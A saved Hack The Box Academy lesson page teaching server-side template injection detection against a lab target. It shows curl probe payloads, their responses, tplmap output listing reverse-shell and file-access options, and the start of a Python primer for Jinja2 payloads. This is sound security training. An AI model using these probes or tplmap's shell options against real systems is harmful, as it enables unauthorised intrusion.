@@ -1,0 +1,1792 @@
+<!DOCTYPE html>
+<!-- saved from url=(0054)https://academy.hackthebox.com/module/145/section/1343 -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<title>Server-side Attacks</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta content="Premium Multipurpose Admin &amp; Dashboard Template" name="description">
+<meta content="Themesbrand" name="author">
+<link rel="shortcut icon" href="https://academy.hackthebox.com/images/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://academy.hackthebox.com/images/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://academy.hackthebox.com/images/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://academy.hackthebox.com/images/apple-touch-icon.png">
+<link rel="mask-icon" href="https://academy.hackthebox.com/images/safari-pinned-tab.svg">
+<link href="./Server-side Attacks16_files/bootstrap-dark.css" id="bootstrap-style" rel="stylesheet" data-style="dark" type="text/css">
+<link href="./Server-side Attacks16_files/icons.css" rel="stylesheet" type="text/css">
+<link href="./Server-side Attacks16_files/app-dark.css" id="app-style" rel="stylesheet" data-style="dark" type="text/css">
+<link href="./Server-side Attacks16_files/prism.css" id="app-style" rel="stylesheet" data-style="dark" type="text/css">
+<link href="./Server-side Attacks16_files/toastr.min.css" rel="stylesheet" type="text/css">
+<link rel="stylesheet" href="./Server-side Attacks16_files/ryt3opf.css">
+<script type="text/javascript" async="" src="./Server-side Attacks16_files/awwxrc0h"></script><script type="text/javascript" async="" src="./Server-side Attacks16_files/uwt.js.download"></script><script type="text/javascript" async="" src="./Server-side Attacks16_files/insight.min.js.download"></script><script src="./Server-side Attacks16_files/346791856678772" async=""></script><script type="text/javascript" async="" src="./Server-side Attacks16_files/fbevents.js.download"></script><script type="text/javascript" async="" src="./Server-side Attacks16_files/analytics.js.download"></script><script type="text/javascript" src="./Server-side Attacks16_files/commons.54701049fd6fb8497e9e.js.gz" async="" status="loaded"></script><script type="text/javascript" src="./Server-side Attacks16_files/intercom.dynamic.js.gz" async="" status="loaded"></script><script type="text/javascript" src="./Server-side Attacks16_files/twitter-ads.dynamic.js.gz" async="" status="loaded"></script><script type="text/javascript" src="./Server-side Attacks16_files/linkedin-insight-tag.dynamic.js.gz" async="" status="loaded"></script><script type="text/javascript" src="./Server-side Attacks16_files/facebook-pixel.dynamic.js.gz" async="" status="loaded"></script><script type="text/javascript" src="./Server-side Attacks16_files/google-analytics.dynamic.js.gz" async="" status="loaded"></script><script type="text/javascript" async="" src="./Server-side Attacks16_files/recaptcha__en.js.download" crossorigin="anonymous" integrity="sha384-TE9Ls1LqNaomGaFdDlxBJIkg+bFnKWbASEx9XrnnCV1SiORfW/qiKK2lsAbkVeBa"></script><script type="text/javascript" async="" src="./Server-side Attacks16_files/analytics.min.js.download"></script><script>
+        !function(){var analytics=window.analytics=window.analytics||[];if(!analytics.initialize)if(analytics.invoked)window.console&&console.error&&console.error("Segment snippet included twice.");else{analytics.invoked=!0;analytics.methods=["trackSubmit","trackClick","trackLink","trackForm","pageview","identify","reset","group","track","ready","alias","debug","page","once","off","on","addSourceMiddleware","addIntegrationMiddleware","setAnonymousId","addDestinationMiddleware"];analytics.factory=function(e){return function(){var t=Array.prototype.slice.call(arguments);t.unshift(e);analytics.push(t);return analytics}};for(var e=0;e<analytics.methods.length;e++){var key=analytics.methods[e];analytics[key]=analytics.factory(key)}analytics.load=function(key,e){var t=document.createElement("script");t.type="text/javascript";t.async=!0;t.src="https://cdn.segment.com/analytics.js/v1/" + key + "/analytics.min.js";var n=document.getElementsByTagName("script")[0];n.parentNode.insertBefore(t,n);analytics._loadOptions=e};analytics._writeKey="eLzeD0QoARKZ42pc8AGEUYpcFLpYkf0I";analytics.SNIPPET_VERSION="4.13.2";
+                analytics.load("eLzeD0QoARKZ42pc8AGEUYpcFLpYkf0I");
+                                                        properties = {"platform":"Academy","platform_version":"V1","module_id":145,"module_name":"Server-side Attacks","module_difficulty":"Medium","section_id":1343,"section_title":"SSTI Exploitation Example 3"};
+                                                analytics.page(
+                    "Module",
+                    properties
+                );
+                                            }
+        }();
+    </script>
+<style>
+    .website-screenshot-url {
+        height: 22px;
+        cursor: text;
+        padding-left: 10px;
+    }
+</style>
+<script src="./Server-side Attacks16_files/api.js.download"></script>
+</head>
+<body data-layout="detached" data-topbar="colored">
+<div class="container-fluid">
+<div id="layout-wrapper">
+<header id="page-topbar">
+<div class="navbar-header">
+<div class="container-fluid">
+<div class="float-right">
+<div class="dropdown d-none d-lg-inline-block ml-1">
+<a href="https://academy.hackthebox.com/billing">
+<button type="button" class="btn btn-extra-light">
+<i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;Purchase Cubes
+</button>
+</a>
+</div>
+<div class="dropdown d-none d-lg-inline-block ml-1">
+<button type="button" class="btn header-item noti-icon waves-effect" data-toggle="fullscreen">
+<i class="mdi mdi-fullscreen"></i>
+</button>
+</div>
+<div class="dropdown d-inline-block">
+<button type="button" class="btn header-item waves-effect" id="page-header-user-dropdown" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+<img class="rounded-circle header-profile-user" src="./Server-side Attacks16_files/1782606024b767354a8c9d75e1a6323a" alt="Header Avatar">
+<span class="d-none d-xl-inline-block ml-1">Tommy034</span>
+<i class="mdi mdi-chevron-down d-none d-xl-inline-block"></i>
+</button>
+<div class="dropdown-menu dropdown-menu-right">
+<a class="dropdown-item" href="https://academy.hackthebox.com/billing"><i class="bx bx-wallet font-size-16 align-middle mr-1"></i> Billing</a>
+<a class="dropdown-item d-block" href="https://academy.hackthebox.com/settings"><i class="bx bx-wrench font-size-16 align-middle mr-1"></i> Settings</a>
+<a class="dropdown-item d-block" href="https://academy.hackthebox.com/vpn"><i class="bx bx-server font-size-16 align-middle mr-1"></i> Vpn Settings</a>
+<div class="dropdown-divider"></div>
+<form method="POST" action="https://academy.hackthebox.com/logout"> <input type="hidden" name="_token" value="OEgK0JdzOZwGIHHODUXYrzCqZr0uFSlpTj7r9g5E"> <a onclick="$(this).closest(&#39;form&#39;).submit()" class="dropdown-item text-danger" href="https://academy.hackthebox.com/module/145/section/1343#"><i class="bx bx-power-off font-size-16 align-middle mr-1 text-danger"></i> Logout</a>
+</form>
+</div>
+</div>
+</div>
+<div class="d-flex align-items-center">
+<div class="navbar-brand-box">
+<a href="https://academy.hackthebox.com/dashboard" class="logo">
+<span class="logo-sm">
+<img src="./Server-side Attacks16_files/logo.svg" alt="" height="30">
+</span>
+<span class="logo-lg">
+<img src="./Server-side Attacks16_files/logo.svg" alt="" height="36">
+</span>
+</a>
+</div>
+<button type="button" class="btn btn-sm px-3 font-size-16 header-item toggle-btn waves-effect" id="vertical-menu-btn">
+<i class="fa fa-fw fa-bars"></i>
+</button>
+<div class="topnav">
+<nav class="navbar navbar-light navbar-expand-lg topnav-menu">
+<div class="collapse navbar-collapse" id="topnav-menu-content">
+<ul class="navbar-nav active">
+<li class="nav-item">
+<a class="nav-link" href="https://academy.hackthebox.com/dashboard"><i class="mdi mdi-monitor-dashboard"></i> Dashboard</a>
+</li>
+<li class="nav-item">
+<a class="nav-link" href="https://academy.hackthebox.com/modules"><i class="mdi mdi-book-open"></i>
+Modules</a>
+</li>
+<li class="nav-item">
+<a class="nav-link" href="https://academy.hackthebox.com/paths"><i class="mdi mdi-map-marker-path"></i> Paths</a>
+</li>
+</ul>
+</div>
+</nav>
+</div>
+</div>
+</div>
+</div>
+</header>
+<div class="main-content">
+<div class="page-content">
+<div class="row">
+<div class="col-12">
+<div class="page-title-box d-flex align-items-center justify-content-between">
+<h4 class="page-title mb-0 font-size-18 letter-spacing-1">Server-side Attacks &nbsp;<i style="cursor:pointer;" data-module-id="145" data-toggle="tooltip" data-title="Toggle To-Do" class="favouriteBtn  fa  fa-heart text-danger" data-original-title="" title=""></i></h4>
+<div class="page-title-right">
+<ol class="breadcrumb m-0">
+<li class="breadcrumb-item"><a href="javascript: void(0);">Page 17</a></li>
+<li class="breadcrumb-item active">SSTI Exploitation Example 3</li>
+</ol>
+</div>
+</div>
+</div>
+</div>
+<div class="row justify-content-xl-center">
+<div class="col-md-12 col-xl-9 col-xxl-7">
+<div class="training-module">
+<h1>SSTI Exploitation Example 3</h1>
+<hr>
+<p>Let's check the last application in the SSTI series. Once again, our focus will be on identifying if the application is vulnerable to Server-Side Template Injection.</p>
+<p>Navigate to the end of this section and click on <code>Click here to spawn the target system!</code>, then use the provided Pwnbox or a local VM to follow along. If you browse the target, you should come across the application below.</p>
+<p><img src="./Server-side Attacks16_files/jinja1.png" alt="image"></p>
+<p>User input is submitted via the <code>cmd</code> parameter through a GET request. Let's submit mathematical expressions in curly brackets in the input field, such as the ones mentioned on the <code>SSTI Identification</code> section, starting with <code>{7*7}</code>.</p>
+<h4>cURL - Interacting with the Target</h4>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">cURL - Interacting with the Target</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">curl</span> -gs <span class="token string">"http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd={7*7}"</span></span></span>
+
+<span class="token output">&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+&lt;style type="text/css"&gt;
+</span><span class="token info punctuation">	</span><span class="token command"><span class="token shell-symbol important">#</span><span class="token bash language-bash"><span class="token builtin class-name">command</span> <span class="token punctuation">{</span></span></span>
+<span class="token output">		resize: horizontal;
+		background-color : transparent;
+		border-color: transparent;
+		font-size: 15px;
+		width: 200px;
+
+	}
+</span><span class="token info punctuation">	</span><span class="token command"><span class="token shell-symbol important">#</span><span class="token bash language-bash">command:active <span class="token punctuation">{</span></span></span>
+<span class="token output">        width: auto;   
+    }
+&lt;/style&gt;
+&lt;head&gt;
+	&lt;meta charset="utf-8"&gt;
+    &lt;meta http-equiv="x-ua-compatible" content="ie=edge"&gt;
+	&lt;meta name="viewport" content="width=device-width, initial-scale=1" /&gt;
+	&lt;link rel="stylesheet" href="/static/css/jquery-ui.css"&gt;
+	&lt;script src="/static/js/jquery-1.12.4.js"&gt;&lt;/script&gt;
+	&lt;script src="/static/js/jquery-ui.js"&gt;&lt;/script&gt;
+	&lt;script src="/static/js/script.js"&gt;&lt;/script&gt;	
+	&lt;link rel="stylesheet" type="text/css" href="/static/css/style.css" /&gt;
+	&lt;title&gt;Windows&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+	&lt;div id="desktop"&gt;
+		&lt;div class="window" data-title="Run"&gt;
+			&lt;form action="/execute" method="get"&gt;
+				&lt;a&gt;C:\&gt;&lt;input type="text" name="cmd" id="command"&gt;&lt;/a&gt;
+				&lt;br/&gt;
+				&lt;a&gt;{7*7}&lt;/a&gt;
+				&lt;br/&gt;
+				&lt;input type="submit" value="execute"&gt;
+			&lt;/form&gt;
+		&lt;/div&gt;
+		&lt;div class="window" data-title="Windows"&gt;
+			&lt;h1&gt;Windows&lt;/h1&gt;
+			&lt;p&gt;Minimize the windows to the taskbar, make them full screen or close them.&lt;/p&gt;
+			&lt;p&gt;Drag the title bar to move the windows or resize them from the bottom right corner.&lt;/p&gt;
+		&lt;/div&gt;
+		
+		&lt;div id="taskbar"&gt;		
+		&lt;/div&gt;
+		
+		&lt;div id="icons"&gt;
+			&lt;a class="openWindow" data-id="0"&gt;Run&lt;/a&gt;
+			&lt;a class="openWindow" data-id="1"&gt;Welcome&lt;/a&gt;
+		&lt;/div&gt;
+		&lt;font size="5px"&gt;&lt;a href="https://html5-templates.com/" rel="nofollow" target="_blank" id="templateLink"&gt;&amp;copy; HTML5-Templates.com&lt;/a&gt;&lt;/font&gt;
+		&lt;!-- You can use this template freely if you leave a visible link to HTML5-Templates.com --&gt;
+	&lt;/div&gt;
+&lt;/body&gt;
+
+</span></code></pre></div></div>
+<p>It doesn't look like the application evaluated the submitted expression. Let us continue with another expression, <code>${7*7}</code> this time.</p>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">cURL - Interacting with the Target</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">curl</span> -gs <span class="token string">'http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd=<span class="token variable">${7*7}</span>'</span></span></span>
+
+<span class="token output">&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+&lt;style type="text/css"&gt;
+</span><span class="token info punctuation">	</span><span class="token command"><span class="token shell-symbol important">#</span><span class="token bash language-bash"><span class="token builtin class-name">command</span> <span class="token punctuation">{</span></span></span>
+<span class="token output">		resize: horizontal;
+		background-color : transparent;
+		border-color: transparent;
+		font-size: 15px;
+		width: 200px;
+
+	}
+</span><span class="token info punctuation">	</span><span class="token command"><span class="token shell-symbol important">#</span><span class="token bash language-bash">command:active <span class="token punctuation">{</span></span></span>
+<span class="token output">        width: auto;   
+    }
+&lt;/style&gt;
+&lt;head&gt;
+	&lt;meta charset="utf-8"&gt;
+    &lt;meta http-equiv="x-ua-compatible" content="ie=edge"&gt;
+	&lt;meta name="viewport" content="width=device-width, initial-scale=1" /&gt;
+	&lt;link rel="stylesheet" href="/static/css/jquery-ui.css"&gt;
+	&lt;script src="/static/js/jquery-1.12.4.js"&gt;&lt;/script&gt;
+	&lt;script src="/static/js/jquery-ui.js"&gt;&lt;/script&gt;
+	&lt;script src="/static/js/script.js"&gt;&lt;/script&gt;	
+	&lt;link rel="stylesheet" type="text/css" href="/static/css/style.css" /&gt;
+	&lt;title&gt;Windows&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+	&lt;div id="desktop"&gt;
+		&lt;div class="window" data-title="Run"&gt;
+			&lt;form action="/execute" method="get"&gt;
+				&lt;a&gt;C:\&gt;&lt;input type="text" name="cmd" id="command"&gt;&lt;/a&gt;
+				&lt;br/&gt;
+</span><span class="token info punctuation">				&lt;a&gt;</span><span class="token command"><span class="token shell-symbol important">$</span><span class="token bash language-bash"><span class="token punctuation">{</span><span class="token number">7</span>*7<span class="token punctuation">}</span></span></span><span class="token output">&lt;/a&gt;
+				&lt;br/&gt;
+				&lt;input type="submit" value="execute"&gt;
+			&lt;/form&gt;
+		&lt;/div&gt;
+		&lt;div class="window" data-title="Windows"&gt;
+			&lt;h1&gt;Windows&lt;/h1&gt;
+			&lt;p&gt;Minimize the windows to the taskbar, make them full screen or close them.&lt;/p&gt;
+			&lt;p&gt;Drag the title bar to move the windows or resize them from the bottom right corner.&lt;/p&gt;
+		&lt;/div&gt;
+		
+		&lt;div id="taskbar"&gt;		
+		&lt;/div&gt;
+		
+		&lt;div id="icons"&gt;
+			&lt;a class="openWindow" data-id="0"&gt;Run&lt;/a&gt;
+			&lt;a class="openWindow" data-id="1"&gt;Welcome&lt;/a&gt;
+		&lt;/div&gt;
+		&lt;font size="5px"&gt;&lt;a href="https://html5-templates.com/" rel="nofollow" target="_blank" id="templateLink"&gt;&amp;copy; HTML5-Templates.com&lt;/a&gt;&lt;/font&gt;
+		&lt;!-- You can use this template freely if you leave a visible link to HTML5-Templates.com --&gt;
+	&lt;/div&gt;
+&lt;/body&gt;
+</span></code></pre></div></div>
+<p>It doesn't look like the application evaluated this expression either. What about <code>{{7*7}}</code>?</p>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">cURL - Interacting with the Target</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">curl</span> -gs <span class="token string">"http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd={{7*7}}"</span></span></span>
+
+<span class="token output">&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+&lt;style type="text/css"&gt;
+</span><span class="token info punctuation">	</span><span class="token command"><span class="token shell-symbol important">#</span><span class="token bash language-bash"><span class="token builtin class-name">command</span> <span class="token punctuation">{</span></span></span>
+<span class="token output">		resize: horizontal;
+		background-color : transparent;
+		border-color: transparent;
+		font-size: 15px;
+		width: 200px;
+
+	}
+</span><span class="token info punctuation">	</span><span class="token command"><span class="token shell-symbol important">#</span><span class="token bash language-bash">command:active <span class="token punctuation">{</span></span></span>
+<span class="token output">        width: auto;   
+    }
+&lt;/style&gt;
+&lt;head&gt;
+	&lt;meta charset="utf-8"&gt;
+    &lt;meta http-equiv="x-ua-compatible" content="ie=edge"&gt;
+	&lt;meta name="viewport" content="width=device-width, initial-scale=1" /&gt;
+	&lt;link rel="stylesheet" href="/static/css/jquery-ui.css"&gt;
+	&lt;script src="/static/js/jquery-1.12.4.js"&gt;&lt;/script&gt;
+	&lt;script src="/static/js/jquery-ui.js"&gt;&lt;/script&gt;
+	&lt;script src="/static/js/script.js"&gt;&lt;/script&gt;	
+	&lt;link rel="stylesheet" type="text/css" href="/static/css/style.css" /&gt;
+	&lt;title&gt;Windows&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+	&lt;div id="desktop"&gt;
+		&lt;div class="window" data-title="Run"&gt;
+			&lt;form action="/execute" method="get"&gt;
+				&lt;a&gt;C:\&gt;&lt;input type="text" name="cmd" id="command"&gt;&lt;/a&gt;
+				&lt;br/&gt;
+				&lt;a&gt;49&lt;/a&gt;
+				&lt;br/&gt;
+				&lt;input type="submit" value="execute"&gt;
+			&lt;/form&gt;
+		&lt;/div&gt;
+		&lt;div class="window" data-title="Windows"&gt;
+			&lt;h1&gt;Windows&lt;/h1&gt;
+			&lt;p&gt;Minimize the windows to the taskbar, make them full screen or close them.&lt;/p&gt;
+			&lt;p&gt;Drag the title bar to move the windows or resize them from the bottom right corner.&lt;/p&gt;
+		&lt;/div&gt;
+		
+		&lt;div id="taskbar"&gt;		
+		&lt;/div&gt;
+		
+		&lt;div id="icons"&gt;
+			&lt;a class="openWindow" data-id="0"&gt;Run&lt;/a&gt;
+			&lt;a class="openWindow" data-id="1"&gt;Welcome&lt;/a&gt;
+		&lt;/div&gt;
+		&lt;font size="5px"&gt;&lt;a href="https://html5-templates.com/" rel="nofollow" target="_blank" id="templateLink"&gt;&amp;copy; HTML5-Templates.com&lt;/a&gt;&lt;/font&gt;
+		&lt;!-- You can use this template freely if you leave a visible link to HTML5-Templates.com --&gt;
+	&lt;/div&gt;
+&lt;/body&gt;
+</span></code></pre></div></div>
+<p>Luckily this time, the application evaluated the latest mathematical expression we submitted and returned the result, 49. It looks like we may be dealing with an SSTI vulnerability!</p>
+<p>As already mentioned, the first thing we need to do when dealing with SSTI vulnerabilities is to identify the template engine the application is utilizing. Once again, let's use PortSwigger's diagram in the <code>SSTI Identification</code>. We already know that the <code>{{7*7}}</code> expression was evaluated successfully. The next expression the diagram suggests trying is <code>{{7*'7'}}</code>. Let us try it and see how the application responds.</p>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">cURL - Interacting with the Target</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">curl</span> -gs <span class="token string">"http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd={{7*'7'}}"</span></span></span>
+
+<span class="token output">&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+&lt;style type="text/css"&gt;
+</span><span class="token info punctuation">	</span><span class="token command"><span class="token shell-symbol important">#</span><span class="token bash language-bash"><span class="token builtin class-name">command</span> <span class="token punctuation">{</span></span></span>
+<span class="token output">		resize: horizontal;
+		background-color : transparent;
+		border-color: transparent;
+		font-size: 15px;
+		width: 200px;
+
+	}
+</span><span class="token info punctuation">	</span><span class="token command"><span class="token shell-symbol important">#</span><span class="token bash language-bash">command:active <span class="token punctuation">{</span></span></span>
+<span class="token output">        width: auto;   
+    }
+&lt;/style&gt;
+&lt;head&gt;
+	&lt;meta charset="utf-8"&gt;
+    &lt;meta http-equiv="x-ua-compatible" content="ie=edge"&gt;
+	&lt;meta name="viewport" content="width=device-width, initial-scale=1" /&gt;
+	&lt;link rel="stylesheet" href="/static/css/jquery-ui.css"&gt;
+	&lt;script src="/static/js/jquery-1.12.4.js"&gt;&lt;/script&gt;
+	&lt;script src="/static/js/jquery-ui.js"&gt;&lt;/script&gt;
+	&lt;script src="/static/js/script.js"&gt;&lt;/script&gt;	
+	&lt;link rel="stylesheet" type="text/css" href="/static/css/style.css" /&gt;
+	&lt;title&gt;Windows&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+	&lt;div id="desktop"&gt;
+		&lt;div class="window" data-title="Run"&gt;
+			&lt;form action="/execute" method="get"&gt;
+				&lt;a&gt;C:\&gt;&lt;input type="text" name="cmd" id="command"&gt;&lt;/a&gt;
+				&lt;br/&gt;
+				&lt;a&gt;7777777&lt;/a&gt;
+				&lt;br/&gt;
+				&lt;input type="submit" value="execute"&gt;
+			&lt;/form&gt;
+		&lt;/div&gt;
+		&lt;div class="window" data-title="Windows"&gt;
+			&lt;h1&gt;Windows&lt;/h1&gt;
+			&lt;p&gt;Minimize the windows to the taskbar, make them full screen or close them.&lt;/p&gt;
+			&lt;p&gt;Drag the title bar to move the windows or resize them from the bottom right corner.&lt;/p&gt;
+		&lt;/div&gt;
+		
+		&lt;div id="taskbar"&gt;		
+		&lt;/div&gt;
+		
+		&lt;div id="icons"&gt;
+			&lt;a class="openWindow" data-id="0"&gt;Run&lt;/a&gt;
+			&lt;a class="openWindow" data-id="1"&gt;Welcome&lt;/a&gt;
+		&lt;/div&gt;
+		&lt;font size="5px"&gt;&lt;a href="https://html5-templates.com/" rel="nofollow" target="_blank" id="templateLink"&gt;&amp;copy; HTML5-Templates.com&lt;/a&gt;&lt;/font&gt;
+		&lt;!-- You can use this template freely if you leave a visible link to HTML5-Templates.com --&gt;
+	&lt;/div&gt;
+&lt;/body&gt;
+</span></code></pre></div></div>
+<p>The application successfully evaluated this expression as well. According to PortSwigger's diagram, we are dealing with either a Jinja2 or a Twig template engine. That being said, the fact that {{7*'7'}} was evaluated with the application returning 7777777 means that Jinja2 is being utilized on the backend.</p>
+<p>We could have automated the template engine identification process we just executed through <code>tplmap</code>, as follows.</p>
+<h4>tplmap.py</h4>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">tplmap.py</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash">./tplmap.py -u <span class="token string">'http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd'</span></span></span>
+
+<span class="token output">    Automatic Server-Side Template Injection Detection and Exploitation Tool
+
+[+] Testing if GET parameter 'cmd' is injectable
+[+] Smarty plugin is testing rendering with tag '*'
+[+] Smarty plugin is testing blind injection
+</span><span class="token info punctuation">[+] Mako plugin is testing rendering with tag '</span><span class="token command"><span class="token shell-symbol important">$</span><span class="token bash language-bash"><span class="token punctuation">{</span>*<span class="token punctuation">}</span><span class="token string">'
+[+] Mako plugin is testing blind injection
+[+] Python plugin is testing rendering with tag '</span>str<span class="token punctuation">(</span>*<span class="token punctuation">)</span><span class="token string">'
+[+] Python plugin is testing blind injection
+[+] Tornado plugin is testing rendering with tag '</span><span class="token punctuation">{</span><span class="token punctuation">{</span>*<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token string">'
+[+] Tornado plugin is testing blind injection
+[+] Jinja2 plugin is testing rendering with tag '</span><span class="token punctuation">{</span><span class="token punctuation">{</span>*<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token string">'
+[+] Jinja2 plugin has confirmed injection with tag '</span><span class="token punctuation">{</span><span class="token punctuation">{</span>*<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token string">'
+[+] Tplmap identified the following injection point:
+
+  GET parameter: cmd
+  Engine: Jinja2
+  Injection: {{*}}
+  Context: text
+  OS: posix-linux
+  Technique: render
+  Capabilities:
+
+   Shell command execution: ok
+   Bind and reverse shell: ok
+   File write: ok
+   File read: ok
+   Code evaluation: ok, python code
+
+[+] Rerun tplmap providing one of the following options:
+
+    --os-shell				Run shell on the target
+    --os-cmd				Execute shell commands
+    --bind-shell PORT			Connect to a shell bind to a target port
+    --reverse-shell HOST PORT	Send a shell back to the attacker'</span>s port</span></span>
+<span class="token output">    --upload LOCAL REMOTE	Upload files to the server
+    --download REMOTE LOCAL	Download remote files
+</span></code></pre></div></div>
+<p>The next step is to gain remote code execution on the target server. Before moving to the payload development part, let's look at some Python for SSTI.</p>
+<hr>
+<h2>Python Primer for SSTI</h2>
+<p>Below is a small dictionary from <a href="https://www.fatalerrors.org/a/0dhx1Dk.html" target="_blank" rel="noopener nofollow">fatalerrors.org</a> to refer to when going over the Jinja2 payload development part of this section:</p>
+<div class="table-responsive"><table class="table table-striped text-left">
+<thead>
+<tr>
+<th><strong>No.</strong></th>
+<th><strong>Methods</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1.</td>
+<td><code>__class__</code></td>
+<td>Returns the object (class) to which the type belongs</td>
+</tr>
+<tr>
+<td>2.</td>
+<td><code>__mro__</code></td>
+<td>Returns a tuple containing the base class inherited by the object. Methods are parsed in the order of tuples.</td>
+</tr>
+<tr>
+<td>3.</td>
+<td><code>__subclasses__</code></td>
+<td>Each new class retains references to subclasses, and this method returns a list of references that are still available in the class</td>
+</tr>
+<tr>
+<td>4.</td>
+<td><code>__builtins__</code></td>
+<td>Returns the builtin methods included in a function</td>
+</tr>
+<tr>
+<td>5.</td>
+<td><code>__globals__</code></td>
+<td>A reference to a dictionary that contains global variables for a function</td>
+</tr>
+<tr>
+<td>6.</td>
+<td><code>__base__</code></td>
+<td>Returns the base class inherited by the object &lt;-- (__ base__ and __ mro__ are used to find the base class)</td>
+</tr>
+<tr>
+<td>7.</td>
+<td><code>__init__</code></td>
+<td>Class initialization method</td>
+</tr>
+</tbody>
+</table></div>
+<p>Start by running Python on Pwnbox's or a local VM's terminal, then follow along.</p>
+<h4>Python 3 Interpreter</h4>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">Python 3 Interpreter</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash">python3</span></span>
+
+<span class="token output">Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
+[GCC 10.2.1 20210110] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+&gt;&gt;&gt; 
+</span></code></pre></div></div>
+<p>Create a string object and use <code>type</code> and <code>__class__</code>, as follows. Then use the <code>dir()</code> command to show all methods and attributes from the object.</p>
+<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">python</span></div><pre class=" language-python"><code class=" language-python"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token keyword">import</span> flask
+<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> s <span class="token operator">=</span> <span class="token string">'HTB'</span>
+<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token builtin">type</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
+
+<span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'str'</span><span class="token operator">&gt;</span>
+
+
+<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> s<span class="token punctuation">.</span>__class__
+
+<span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'str'</span><span class="token operator">&gt;</span>
+
+
+<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token builtin">dir</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
+
